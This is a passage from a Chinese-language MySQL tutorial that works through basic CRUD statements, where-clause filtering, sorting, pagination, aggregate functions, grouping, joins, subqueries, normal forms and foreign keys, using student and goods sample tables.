values(&#39;刘备&#39;, 1.75),(&#39;曹操&#39;, 1.6);</code></pre><p><strong>说明:</strong></p><ul><li>主键列是自动增长，但是在全列插入时需要占位，通常使用空值(0或者null或者default)</li><li>在全列插入时，如果字段列有默认值可以使用 default 来占位，插入后的数据就是之前设置的默认值</li></ul></li><li><p>修改数据</p><pre><code class="sql">update 表名 set 列1=值1,列2=值2... where 条件例：update students set age = 18, gender = &#39;女&#39; where id = 6;</code></pre></li><li><p>删除数据</p><pre><code class="sql">delete from 表名 where 条件例：delete from students where id=5;</code></pre><p>问题:</p><p>上面的操作称之为物理删除，一旦删除就不容易恢复，我们可以使用逻辑删除的方式来解决这个问题。</p><pre><code class="sql">-- 添加删除表示字段，0表示未删除 1表示删除alter table students add isdelete bit default 0;-- 逻辑删除数据update students set isdelete = 1 where id = 8;</code></pre><p><strong>说明:</strong></p><ul><li>逻辑删除，本质就是修改操作</li></ul></li></ol><h3 id="6-as和distinct关键字"><a href="#6-as和distinct关键字" class="headerlink" title="6.as和distinct关键字"></a>6.as和distinct关键字</h3><h4 id="6-1-as关键字"><a href="#6-1-as关键字" class="headerlink" title="6.1 as关键字"></a>6.1 as关键字</h4><p>在使用SQL语句显示结果的时候，往往在屏幕显示的字段名并不具备良好的可读性，此时可以使用 as 给字段起一个别名。</p><ol><li><p>使用 as 给字段起别名</p><pre><code class="sql">select id as 序号, name as 名字, gender as 性别 from students;</code></pre></li><li><p>可以通过 as 给表起别名</p><pre><code class="sql">-- 如果是单表查询 可以省略表名select id, name, gender from students;-- 表名.字段名select students.id,students.name,students.gender from students;-- 可以通过 as 给表起别名 select s.id,s.name,s.gender from students as s;</code></pre></li></ol><h4 id="6-2-distinct关键字"><a href="#6-2-distinct关键字" class="headerlink" title="6.2 distinct关键字"></a>6.2 distinct关键字</h4><p>distinct可以去除重复数据行。</p><pre><code class="sql">select distinct 列1,... from 表名;例： 查询班级中学生的性别select name, gender from students;-- 看到了很多重复数据 想要对其中重复数据行进行去重操作可以使用 distinctselect distinct name, gender from students;</code></pre><h3 id="7-where条件查询"><a href="#7-where条件查询" class="headerlink" title="7.where条件查询"></a>7.where条件查询</h3><h4 id="7-1-where条件查询的介绍"><a href="#7-1-where条件查询的介绍" class="headerlink" title="7.1 where条件查询的介绍"></a>7.1 where条件查询的介绍</h4><p>使用where条件查询可以对表中的数据进行筛选，条件成立的记录会出现在结果集中。</p><p><strong>where语句支持的运算符:</strong></p><ol><li>比较运算符</li><li>逻辑运算符</li><li>模糊查询</li><li>范围查询</li><li>空判断</li></ol><p><strong>where条件查询语法格式如下:</strong></p><pre><code class="sql">select * from 表名 where 条件;例：select * from students where id = 1;</code></pre><h4 id="7-2-比较运算符查询"><a href="#7-2-比较运算符查询" class="headerlink" title="7.2 比较运算符查询"></a>7.2 比较运算符查询</h4><ol><li>等于: =</li><li>大于: &gt;</li><li>大于等于: &gt;=</li><li>小于: &lt;</li><li>小于等于: &lt;=</li><li>不等于: != 或 &lt;&gt;</li></ol><p><strong>例1：查询编号大于3的学生:</strong></p><pre><code class="sql">select * from students where id &gt; 3;</code></pre><p><strong>例2：查询编号不大于4的学生:</strong></p><pre><code class="sql">select * from students where id &lt;= 4;</code></pre><p><strong>例3：查询姓名不是“黄蓉”的学生:</strong></p><pre><code class="sql">select * from students where name != &#39;黄蓉&#39;;</code></pre><p><strong>例4：查询没被删除的学生:</strong></p><pre><code class="sql">select * from students where is_delete=0;</code></pre><h4 id="7-3-逻辑运算符查询"><a href="#7-3-逻辑运算符查询" class="headerlink" title="7.3 逻辑运算符查询"></a>7.3 逻辑运算符查询</h4><ol><li>and</li><li>or</li><li>not</li></ol><p><strong>例1：查询编号大于3的女同学:</strong></p><pre><code class="sql">select * from students where id &gt; 3 and gender=0;</code></pre><p><strong>例2：查询编号小于4或没被删除的学生:</strong></p><pre><code class="sql">select * from students where id &lt; 4 or is_delete=0;</code></pre><p><strong>例3：查询年龄不在10岁到15岁之间的学生:</strong></p><pre><code class="sql">select * from students where not (age &gt;= 10 and age &lt;= 15);</code></pre><p><strong>说明:</strong></p><ul><li>多个条件判断想要作为一个整体，可以结合‘()’。</li></ul><h4 id="7-4-模糊查询"><a href="#7-4-模糊查询" class="headerlink" title="7.4 模糊查询"></a>7.4 模糊查询</h4><ol><li>like是模糊查询关键字</li><li>%表示任意多个任意字符</li><li>_表示一个任意字符</li></ol><p><strong>例1：查询姓黄的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄%&#39;;</code></pre><p><strong>例2：查询姓黄并且“名”是一个字的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄_&#39;;</code></pre><p><strong>例3：查询姓黄或叫靖的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄%&#39; or name like &#39;%靖&#39;;</code></pre><h4 id="7-5-范围查询"><a href="#7-5-范围查询" class="headerlink" title="7.5 范围查询"></a>7.5 范围查询</h4><ol><li>between .. and .. 表示在一个连续的范围内查询</li><li>in 表示在一个非连续的范围内查询</li></ol><p><strong>例1：查询编号为3至8的学生:</strong></p><pre><code class="sql">select * from students where id between 3 and 8;</code></pre><p><strong>例2：查询编号不是3至8的男生:</strong></p><pre><code>select * from students where (not id between 3 and 8) and gender=&#39;男&#39;;</code></pre><h4 id="7-6-空判断查询"><a href="#7-6-空判断查询" class="headerlink" title="7.6 空判断查询"></a>7.6 空判断查询</h4><ol><li>判断为空使用: is null</li><li>判断非空使用: is not null</li></ol><p><strong>例1：查询没有填写身高的学生:</strong></p><pre><code class="sql">select * from students where height is null;</code></pre><p><strong>注意:</strong></p><ol><li>不能使用 where height = null 判断为空</li><li>不能使用 where height != null 判断非空</li><li>null 不等于 ‘’ 空字符串</li></ol><h3 id="8-排序"><a href="#8-排序" class="headerlink" title="8.排序"></a>8.排序</h3><h4 id="8-1-排序查询语法"><a href="#8-1-排序查询语法" class="headerlink" title="8.1 排序查询语法"></a>8.1 排序查询语法</h4><p>排序查询语法：</p><pre><code class="sql">select * from 表名 order by 列1 asc|desc [,列2 asc|desc,...]</code></pre><p><strong>语法说明:</strong></p><ol><li>先按照列1进行排序，如果列1的值相同时，则按照 列2 排序，以此类推</li><li>asc从小到大排列，即升序</li><li>desc从大到小排序，即降序</li><li>默认按照列值从小到大排序（即asc关键字）</li></ol><p><strong>例1：查询未删除男生信息，按学号降序:</strong></p><pre><code class="sql">select * from students where gender=1 and is_delete=0 order by id desc;</code></pre><p><strong>例2：显示所有的学生信息，先按照年龄从大–&gt;小排序，当年龄相同时 按照身高从高–&gt;矮排序:</strong></p><pre><code class="sql">select * from students  order by age desc,height desc;</code></pre><p>小结：</p><ol><li>排序使用 order by 关键字</li><li>asc 表示升序</li><li>desc 表示降序</li></ol><h3 id="9-分页查询"><a href="#9-分页查询" class="headerlink" title="9.分页查询"></a>9.分页查询</h3><h4 id="9-1-分页查询的介绍"><a href="#9-1-分页查询的介绍" class="headerlink" title="9.1 分页查询的介绍"></a>9.1 分页查询的介绍</h4><p>当我们在京东购物，浏览商品列表的时候，由于数据特别多，一页显示不完，一页一页的进行显示，这就是分页查询</p><h4 id="9-2-分页查询的语法"><a href="#9-2-分页查询的语法" class="headerlink" title="9.2 分页查询的语法"></a>9.2 分页查询的语法</h4><pre><code class="sql">select * from 表名 limit start,count</code></pre><p><strong>说明:</strong></p><ol><li>limit是分页查询关键字</li><li>start表示开始行索引，默认是0</li><li>count表示查询条数</li></ol><p><strong>例1：查询前3行男生信息:</strong></p><pre><code class="sql">select * from students where gender=1 limit 0,3;简写select * from students where gender=1 limit 3;</code></pre><h4 id="9-3-分页查询案例"><a href="#9-3-分页查询案例" class="headerlink" title="9.3 分页查询案例"></a>9.3 分页查询案例</h4><p>已知每页显示m条数据，求第n页显示的数据</p><p>提示: 关键是求每页的开始行索引</p><p><strong>查询学生表，获取第n页数据的SQL语句:</strong></p><pre><code class="sql">select * from students limit (n-1)*m,m</code></pre><h2 id="二、MySQL数据库的条件查询"><a href="#二、MySQL数据库的条件查询" class="headerlink" title="二、MySQL数据库的条件查询"></a>二、MySQL数据库的条件查询</h2><h3 id="1-聚合函数"><a href="#1-聚合函数" class="headerlink" title="1.聚合函数"></a>1.聚合函数</h3><h4 id="1-1-聚合函数的介绍"><a href="#1-1-聚合函数的介绍" class="headerlink" title="1.1 聚合函数的介绍"></a>1.1 聚合函数的介绍</h4><p>聚合函数又叫组函数，通常是对表中的数据进行统计和计算，一般结合分组(group by)来使用，用于统计和计算分组数据。</p><p><strong>常用的聚合函数:</strong></p><ol><li>count(col): 表示求指定列的总行数</li><li>max(col): 表示求指定列的最大值</li><li>min(col): 表示求指定列的最小值</li><li>sum(col): 表示求指定列的和</li><li>avg(col): 表示求指定列的平均值</li></ol><h4 id="1-2-求总行数"><a href="#1-2-求总行数" class="headerlink" title="1.2 求总行数"></a>1.2 求总行数</h4><pre><code class="sql">-- 返回非NULL数据的总行数.select count(height) from students; -- 返回总行数，包含null值记录;select count(*) from students;</code></pre><h4 id="1-3-求最大值"><a href="#1-3-求最大值" class="headerlink" title="1.3 求最大值"></a>1.3 求最大值</h4><pre><code class="sql">-- 查询女生的编号最大值select max(id) from students where gender = 2;</code></pre><h4 id="1-4-求最小值"><a href="#1-4-求最小值" class="headerlink" title="1.4 求最小值"></a>1.4 求最小值</h4><pre><code class="sql">-- 查询未删除的学生最小编号select min(id) from students where is_delete = 0;</code></pre><h4 id="1-5-求和"><a href="#1-5-求和" class="headerlink" title="1.5 求和"></a>1.5 求和</h4><pre><code class="sql">-- 查询男生的总身高select sum(height) from students where gender = 1;-- 平均身高select sum(height) / count(*) from students where gender = 1;</code></pre><h4 id="1-6-求平均值"><a href="#1-6-求平均值" class="headerlink" title="1.6 求平均值"></a>1.6 求平均值</h4><pre><code class="sql">-- 求男生的平均身高, 聚合函数不统计null值，平均身高有误select avg(height) from students where gender = 1;-- 求男生的平均身高, 包含身高是null的select avg(ifnull(height,0)) from students where gender = 1;</code></pre><p><strong>说明</strong></p><ul><li>ifnull函数: 表示判断指定字段的值是否为null，如果为空使用自己提供的值。</li></ul><h4 id="1-7-聚合函数的特点"><a href="#1-7-聚合函数的特点" class="headerlink" title="1.7 聚合函数的特点"></a>1.7 聚合函数的特点</h4><ul><li>聚合函数默认忽略字段为null的记录 要想列值为null的记录也参与计算，必须使用ifnull函数对null值做替换。</li></ul><h3 id="2-分组查询"><a href="#2-分组查询" class="headerlink" title="2. 分组查询"></a>2. 分组查询</h3><ul><li>group by 根据指定的一个或者多个字段对数据进行分组</li><li>group_concat(字段名)函数是统计每个分组指定字段的信息集合</li><li>聚合函数在和 group by 结合使用时, 聚合函数统计和计算的是每个分组的数据</li><li>having 是对分组数据进行条件过滤</li><li>with rollup在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</li></ul><h4 id="2-1-分组查询介绍"><a href="#2-1-分组查询介绍" class="headerlink" title="2.1 分组查询介绍"></a>2.1 分组查询介绍</h4><p>分组查询就是将查询结果按照指定字段进行分组，字段中数据相等的分为一组。</p><p><strong>分组查询基本的语法格式如下：</strong></p><p>GROUP BY 列名 [HAVING 条件表达式] [WITH ROLLUP]</p><p><strong>说明:</strong></p><ul><li>列名: 是指按照指定字段的值进行分组。</li><li>HAVING 条件表达式: 用来过滤分组后的数据。</li><li>WITH ROLLUP：在所有记录的最后加上一条记录，显示select查询时聚合函数的统计和计算结果</li></ul><h4 id="2-2-group-by的使用"><a href="#2-2-group-by的使用" class="headerlink" title="2.2 group by的使用"></a>2.2 group by的使用</h4><p>group by可用于单个字段分组，也可用于多个字段分组</p><pre><code class="sql">-- 根据gender字段来分组select gender from students group by gender;-- 根据name和gender字段进行分组select name, gender from students group by name, gender;</code></pre><h4 id="2-3-group-by-group-concat-的使用"><a href="#2-3-group-by-group-concat-的使用" class="headerlink" title="2.3 group by + group_concat()的使用"></a>2.3 group by + group_concat()的使用</h4><p>group_concat(字段名): 统计每个分组指定字段的信息集合，每个信息之间使用逗号进行分割</p><pre><code class="sql">-- 根据gender字段进行分组， 查询gender字段和分组的name字段信息select gender,group_concat(name) from students group by gender;</code></pre><h4 id="2-4-group-by-聚合函数的使用"><a href="#2-4-group-by-聚合函数的使用" class="headerlink" title="2.4 group by + 聚合函数的使用"></a>2.4 group by + 聚合函数的使用</h4><pre><code class="sql">-- 统计不同性别的人的平均年龄select gender,avg(age) from students group by gender;-- 统计不同性别的人的个数select gender,count(*) from students group by gender;</code></pre><h4 id="2-5-group-by-having的使用"><a href="#2-5-group-by-having的使用" class="headerlink" title="2.5 group by + having的使用"></a>2.5 group by + having的使用</h4><p>having作用和where类似都是过滤数据的，但having是过滤分组数据的，只能用于group by</p><pre><code class="sql">-- 根据gender字段进行分组，统计分组条数大于2的select gender,count(*) from students group by gender having count(*)&gt;2;</code></pre><h4 id="2-6-group-by-with-rollup的使用"><a href="#2-6-group-by-with-rollup的使用" class="headerlink" title="2.6 group by + with rollup的使用"></a>2.6 group by + with rollup的使用</h4><p>with rollup的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p><pre><code class="sql">-- 根据gender字段进行分组，汇总总人数select gender,count(*) from students group by gender with rollup;-- 根据gender字段进行分组，汇总所有人的年龄select gender,group_concat(age) from students group by gender with rollup;</code></pre><h3 id="3-连接查询-内连接"><a href="#3-连接查询-内连接" class="headerlink" title="3.连接查询-内连接"></a>3.连接查询-内连接</h3><ul><li>内连接使用inner join .. on .., on 表示两个表的连接查询条件</li><li>内连接根据连接查询条件取出两个表的 “交集”</li></ul><h4 id="3-1-连接查询的介绍"><a href="#3-1-连接查询的介绍" class="headerlink" title="3.1 连接查询的介绍"></a>3.1 连接查询的介绍</h4><p>连接查询可以实现多个表的查询，当查询的字段数据来自不同的表就可以使用连接查询来完成。</p><p>连接查询可以分为:</p><ol><li>内连接查询</li><li>左连接查询</li><li>右连接查询</li><li>自连接查询</li></ol><h4 id="3-2-内连接查询"><a href="#3-2-内连接查询" class="headerlink" title="3.2 内连接查询"></a>3.2 内连接查询</h4><p>查询两个表中符合条件的共有记录</p><p><strong>内连接查询效果图:</strong></p><p><img src="E:%5Ccaijinbo_posts%5Cpicture%5C%E5%86%85%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2.png" alt="内连接查询"></p><p><strong>内连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 inner join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>inner join 就是内连接查询关键字</li><li>on 就是连接查询条件</li></ul><p><strong>例1：使用内连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s inner join classes as c on s.cls_id = c.id;</code></pre><h3 id="4-连接查询-左连接"><a href="#4-连接查询-左连接" class="headerlink" title="4.连接查询-左连接"></a>4.连接查询-左连接</h3><ul><li>左连接使用left join .. on .., on 表示两个表的连接查询条件</li><li>左连接以左表为主根据条件查询右表数据，右表数据不存在使用null值填充。</li></ul><h4 id="4-1-左连接查询"><a href="#4-1-左连接查询" class="headerlink" title="4.1 左连接查询"></a>4.1 左连接查询</h4><p>以左表为主根据条件查询右表数据，如果根据条件查询右表数据不存在使用null值填充</p><p><strong>左连接查询效果图:</strong></p><p><img src="E:%5Ccaijinbo_posts%5Cpicture/%E5%B7%A6%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2.png" alt="内连接查询"></p><p><strong>左连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 left join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>left join 就是左连接查询关键字</li><li>on 就是连接查询条件</li><li>表1 是左表</li><li>表2 是右表</li></ul><p><strong>例1：使用左连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s left join classes as c on s.cls_id = c.id;</code></pre><h3 id="5-连接查询-右连接"><a href="#5-连接查询-右连接" class="headerlink" title="5.连接查询-右连接"></a>5.连接查询-右连接</h3><ul><li>右连接使用right join .. on .., on 表示两个表的连接查询条件</li><li>右连接以右表为主根据条件查询左表数据，左表数据不存在使用null值填充。</li></ul><h4 id="5-1-右连接查询"><a href="#5-1-右连接查询" class="headerlink" title="5.1 右连接查询"></a>5.1 右连接查询</h4><p>以右表为主根据条件查询左表数据，如果根据条件查询左表数据不存在使用null值填充</p><p><strong>右连接查询效果图:</strong></p><p><img src="E:%5Ccaijinbo_posts%5Cpicture/%E5%8F%B3%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2.png" alt="内连接查询"></p><p><strong>右连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 right join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>right join 就是右连接查询关键字</li><li>on 就是连接查询条件</li><li>表1 是左表</li><li>表2 是右表</li></ul><p><strong>例1：使用右连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s right join classes as c on s.cls_id = c.id;</code></pre><h3 id="6-连接查询-自连接"><a href="#6-连接查询-自连接" class="headerlink" title="6.连接查询-自连接"></a>6.连接查询-自连接</h3><ul><li>自连接查询就是把一张表模拟成左右两张表，然后进行连表查询。</li><li>自连接就是一种特殊的连接方式，连接的表还是本身这张表</li></ul><h4 id="6-1-自连接查询"><a href="#6-1-自连接查询" class="headerlink" title="6.1 自连接查询"></a>6.1 自连接查询</h4><p>左表和右表是同一个表，根据连接查询条件查询两个表中的数据。</p><p><strong>自连接查询的用法:</strong></p><pre><code class="sql">select c.title, c.pid, p.id, p.title from areas as c inner join areas as p on c.pid = p.id where p.title = &#39;目标&#39;;</code></pre><p><strong>说明:</strong></p><ul><li><strong>自连接查询必须对表起别名</strong></li></ul><p><strong>这个直连接没有配图说明，可能会难以理解</strong></p><h3 id="7-子查询"><a href="#7-子查询" class="headerlink" title="7.子查询"></a>7.子查询</h3><h4 id="7-1-子查询的介绍"><a href="#7-1-子查询的介绍" class="headerlink" title="7.1 子查询的介绍"></a>7.1 子查询的介绍</h4><p>在一个 select 语句中,嵌入了另外一个 select 语句, 那么被嵌入的 select 语句称之为子查询语句，外部那个select语句则称为主查询.</p><p><strong>主查询和子查询的关系:</strong></p><ol><li>子查询是嵌入到主查询中</li><li>子查询是辅助主查询的,要么充当条件,要么充当数据源</li><li>子查询是可以独立存在的语句,是一条完整的 select 语句</li></ol><h4 id="7-2-子查询的使用"><a href="#7-2-子查询的使用" class="headerlink" title="7.2 子查询的使用"></a>7.2 子查询的使用</h4><p><strong>例1. 查询大于平均年龄的学生:</strong></p><pre><code class="sql">select * from students where age &gt; (select avg(age) from students);</code></pre><p><strong>例2. 查询学生在班的所有班级名字:</strong></p><pre><code class="sql">select name from classes where id in (select cls_id from students where cls_id is not null);</code></pre><p><strong>例3. 查找年龄最大,身高最高的学生:</strong></p><pre><code class="sql">select * from students where (age, height) =  (select max(age), max(height) from students);</code></pre><h4 id="7-3-小结"><a href="#7-3-小结" class="headerlink" title="7.3 小结"></a>7.3 小结</h4><ul><li>子查询是一个完整的SQL语句，子查询被嵌入到一对小括号里面</li></ul><h3 id="8-数据库设计之三范式"><a href="#8-数据库设计之三范式" class="headerlink" title="8.数据库设计之三范式"></a>8.数据库设计之三范式</h3><h4 id="8-1-数据库设计之三范式的介绍"><a href="#8-1-数据库设计之三范式的介绍" class="headerlink" title="8.1 数据库设计之三范式的介绍"></a>8.1 数据库设计之三范式的介绍</h4><p>范式: 对设计数据库提出的一些规范，目前有迹可寻的共有8种范式，一般遵守3范式即可。</p><ul><li>第一范式（1NF）: 强调的是列的原子性，即列不能够再分成其他几列。</li><li>第二范式（2NF）: 满足 1NF，另外包含两部分内容，一是表必须有一个主键；二是非主键字段 必须完全依赖于主键，而不能只依赖于主键的一部分。</li><li>第三范式（3NF）: 满足 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。</li></ul><h4 id="8-2-E-R模型的介绍"><a href="#8-2-E-R模型的介绍" class="headerlink" title="8.2 E-R模型的介绍"></a>8.2 E-R模型的介绍</h4><ul><li>E-R模型由 实体、属性、实体之间的关系构成，主要用来描述数据库中表结构。</li><li>开发流程是先画出E-R模型，然后根据三范式设计数据库中的表结构</li></ul><p>E-R模型即实体-关系模型，E-R模型就是描述数据库存储数据的结构模型。</p><p><strong>E-R模型的使用场景:</strong></p><ol><li>对于大型公司开发项目，我们需要根据产品经理的设计，我们先使用建模工具, 如:power designer，db desinger等这些软件来画出实体-关系模型(E-R模型)</li><li>然后根据三范式设计数据库表结构</li></ol><p><strong>E-R模型的效果图:</strong></p><p><img src="E:%5Ccaijinbo_posts%5Cpicture/E-R%E6%A8%A1%E5%9E%8B%E5%9B%BE.png" alt="E-R模型图"></p><p><strong>说明:</strong></p><ul><li>实体: 用矩形表示，并标注实体名称</li><li>属性: 用椭圆表示，并标注属性名称，</li><li>关系: 用菱形表示，并标注关系名称<ul><li>一对一</li><li>一对多</li><li>多对多</li></ul></li></ul><p><strong>一对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>关系也是一种数据，需要通过一个字段存储在表中</li><li>1对1关系，在表A或表B中创建一个字段，存储另一个表的主键值</li></ul><p><strong>一对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>1对多关系，在多的一方表(学生表)中创建一个字段，存储班级表的主键值</li></ul><p><strong>多对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>多对多关系，新建一张表C，这个表只有两个字段，一个用于存储A的主键值，一个用于存储B的主键值</li></ul><h3 id="9-外键SQL语句的编写"><a href="#9-外键SQL语句的编写" class="headerlink" title="9.外键SQL语句的编写"></a>9.外键SQL语句的编写</h3><ul><li>添加外键约束: alter table 从表 add foreign key(外键字段) references 主表(主键字段);</li><li>删除外键约束: alter table 表名 drop foreign key 外键名;</li></ul><h4 id="9-1-外键约束作用"><a href="#9-1-外键约束作用" class="headerlink" title="9.1 外键约束作用"></a>9.1 外键约束作用</h4><p>外键约束:对外键字段的值进行更新和插入时会和引用表中字段的数据进行验证，数据如果不合法则更新和插入会失败，保证数据的有效性</p><h4 id="9-2-对于已经存在的字段添加外键约束"><a href="#9-2-对于已经存在的字段添加外键约束" class="headerlink" title="9.2 对于已经存在的字段添加外键约束"></a>9.2 对于已经存在的字段添加外键约束</h4><pre><code class="sql">-- 为cls_id字段添加外键约束alter table students add foreign key(cls_id) references classes(id);</code></pre><h4 id="9-3-在创建数据表时设置外键约束"><a href="#9-3-在创建数据表时设置外键约束" class="headerlink" title="9.3 在创建数据表时设置外键约束"></a>9.3 在创建数据表时设置外键约束</h4><pre><code class="sql">-- 创建学校表create table school(    id int not null primary key auto_increment,     name varchar(10));-- 创建老师表create table teacher(    id int not null primary key auto_increment,     name varchar(10),     s_id int not null,     foreign key(s_id) references school(id));</code></pre><h4 id="9-4-删除外键约束"><a href="#9-4-删除外键约束" class="headerlink" title="9.4 删除外键约束"></a>9.4 删除外键约束</h4><pre><code class="sql">-- 需要先获取外键约束名称,该名称系统会自动生成,可以通过查看表创建语句来获取名称show create table teacher;-- 获取名称之后就可以根据名称来删除外键约束alter table teacher drop foreign key 外键名;</code></pre><h3 id="10-演练-分组和聚合函数的组合使用"><a href="#10-演练-分组和聚合函数的组合使用" class="headerlink" title="10.演练-分组和聚合函数的组合使用"></a>10.演练-分组和聚合函数的组合使用</h3><h4 id="10-1-数据准备"><a href="#10-1-数据准备" class="headerlink" title="10.1 数据准备"></a>10.1 数据准备</h4><pre><code class="sql">-- 创建 &quot;京东&quot; 数据库create database jing_dong charset=utf8;-- 使用 &quot;京东&quot; 数据库use jing_dong;-- 创建一个商品goods数据表create table goods(    id int unsigned primary key auto_increment not null,    name varchar(150) not null,    cate_name varchar(40) not null,    brand_name varchar(40) not null,    price decimal(10,3) not null default 0,    is_show bit not null default 1,    is_saleoff bit not null default 0);-- 向goods表中插入数据insert into goods values(0,&#39;r510vc 15.6英寸笔记本&#39;,&#39;笔记本&#39;,&#39;华硕&#39;,&#39;3399&#39;,default,default); insert into goods values(0,&#39;y400n 14.0英寸笔记本电脑&#39;,&#39;笔记本&#39;,&#39;联想&#39;,&#39;4999&#39;,default,default);insert into goods values(0,&#39;g150th 15.6英寸游戏本&#39;,&#39;游戏本&#39;,&#39;雷神&#39;,&#39;8499&#39;,default,default); insert into goods values(0,&#39;x550cc 15.6英寸笔记本&#39;,&#39;笔记本&#39;,&#39;华硕&#39;,&#39;2799&#39;,default,default); insert into goods values(0,&#39;x240 超极本&#39;,&#39;超级本&#39;,&#39;联想&#39;,&#39;4880&#39;,default,default); insert into goods values(0,&#39;u330p 13.3英寸超极本&#39;,&#39;超级本&#39;,&#39;联想&#39;,&#39;4299&#39;,default,default); insert into goods values(0,&#39;svp13226scb 触控超极本&#39;,&#39;超级本&#39;,&#39;索尼&#39;,&#39;7999&#39;,default,default); insert into goods values(0,&#39;ipad mini 7.9英寸平板电脑&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;1998&#39;,default,default);insert into goods values(0,&#39;ipad air 9.7英寸平板电脑&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;3388&#39;,default,default); insert into goods values(0,&#39;ipad mini 配备 retina 显示屏&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;2788&#39;,default,default); insert into goods values(0,&#39;ideacentre c340 20英寸一体电脑 &#39;,&#39;台式机&#39;,&#39;联想&#39;,&#39;3499&#39;,default,default); insert into goods values(0,&#39;vostro 3800-r1206 台式电脑&#39;,&#39;台式机&#39;,&#39;戴尔&#39;,&#39;2899&#39;,default,default); insert into goods values(0,&#39;imac me086ch/a 21.5英寸一体电脑&#39;,&#39;台式机&#39;,&#39;苹果&#39;,&#39;9188&#39;,default,default); insert into goods values(0,&#39;at7-7414lp 台式电脑 linux ）&#39;,&#39;台式机&#39;,&#39;宏碁&#39;,&#39;3699&#39;,default,default); insert into goods values(0,&#39;z220sff f4f06pa工作站&#39;,&#39;服务器/工作站&#39;,&#39;惠普&#39;,&#39;4288&#39;,default,default); insert into goods values(0,&#39;poweredge ii服务器&#39;,&#39;服务器/工作站&#39;,&#39;戴尔&#39;,&#39;5388&#39;,default,default); insert into goods values(0,&#39;mac pro专业级台式电脑&#39;,&#39;服务器/工作站&#39;,&#39;苹果&#39;,&#39;28888&#39;,default,default); insert into goods values(0,&#39;hmz-t3w 头戴显示设备&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;6999&#39;,default,default); insert into goods values(0,&#39;商务双肩背包&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;99&#39;,default,default); insert into goods values(0,&#39;x3250 m4机架式服务器&#39;,&#39;服务器/工作站&#39;,&#39;ibm&#39;,&#39;6888&#39;,default,default); insert into goods values(0,&#39;商务双肩背包&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;99&#39;,default,default);</code></pre><p><strong>表结构说明:</strong></p><ul><li>id 表示主键 自增</li><li>name 表示商品名称</li><li>cate_name 表示分类名称</li><li>brand_name 表示品牌名称</li><li>price 表示价格</li><li>is_show 表示是否显示</li><li>is_saleoff 表示是否售完</li></ul><h4 id="10-2-SQL语句演练"><a href="#10-2-SQL语句演练" class="headerlink" title="10.2 SQL语句演练"></a>10.2 SQL语句演练</h4><ol><li><p>查询类型cate_name为 ‘超级本’ 的商品名称、价格</p><pre><code class="sql"> select name,price from goods where cate_name = &#39;超级本&#39;;</code></pre></li><li><p>显示商品的分类</p><pre><code class="sql"> select cate_name from goods group by cate_name;</code></pre></li><li><p>求所有电脑产品的平均价格,并且保留两位小数</p><pre><code class="sql"> select round(avg(price),2) as avg_price from goods;</code></pre></li><li><p>显示每种商品的平均价格</p><pre><code class="sql"> select cate_name,avg(price) from goods group by cate_name;</code></pre></li><li><p>查询每种类型的商品中 最贵、最便宜、平均价、数量</p><pre><code class="sql"> select cate_name,max(price),min(price),avg(price),count(*)  from goods group by cate_name;</code></pre></li><li><p>查询所有价格大于平均价格的商品，并且按价格降序排序</p><pre><code class="sql"> select id,name,price from goods  where price &gt; (select round(avg(price),2) as avg_price from goods)  order by price desc;</code></pre></li></ol><h2 id="三、MySQL数据库的高级使用"><a href="#三、MySQL数据库的高级使用" class="headerlink" title="三、MySQL数据库的高级使用"></a>三、MySQL数据库的高级使用</h2><h3 id="1-将查询结果插入到其它表中"><a href="#1-将查询结果插入到其它表中" class="headerlink" title="1.将查询结果插入到其它表中"></a>1.将查询结果插入到其它表中</h3><h4 id="1-1-思考"><a href="#1-1-思考" class="headerlink" title="1.1 思考"></a>1.1 思考</h4><p>目前只有一个goods表，我们想要增加一个商品分类信息，比如：移动设备这个分类信息，只通过goods表无法完成商品分类的添加，那么如何实现添加商品分类信息的操作?</p><p><strong>答案:</strong></p><ol><li>创建一个商品分类表，把goods表中的商品分类信息添加到该表中。</li><li>将goods表中的分类名称更改成商品分类表中对应的分类id</li></ol><h4 id="2-2-创建商品分类表"><a href="#2-2-创建商品分类表" class="headerlink" title="2.2 创建商品分类表"></a>2.2 创建商品分类表</h4><pre><code class="sql">-- 创建商品分类表create table good_cates(    id int not null primary key auto_increment,     name varchar(50) not null);</code></pre><h4 id="1-3-把goods表中的商品分类添加到商品分类表"><a href="#1-3-把goods表中的商品分类添加到商品分类表" class="headerlink" title="1.3 把goods表中的商品分类添加到商品分类表"></a>1.3 把goods表中的商品分类添加到商品分类表</h4><pre><code class="sql">-- 查询goods表中商品的分类信息select cate_name from goods group by cate_name;-- 将查询结果插入到good_cates表中insert into good_cates(name) select cate_name from goods group by cate_name;-- 添加移动设备分类信息insert into good_cates(name) values(&#39;移动设备&#39;);</code></pre><p><strong>说明:</strong></p><ul><li>insert into .. select .. 表示: 把查询结果插入到指定表中，也就是表复制。</li></ul><h4 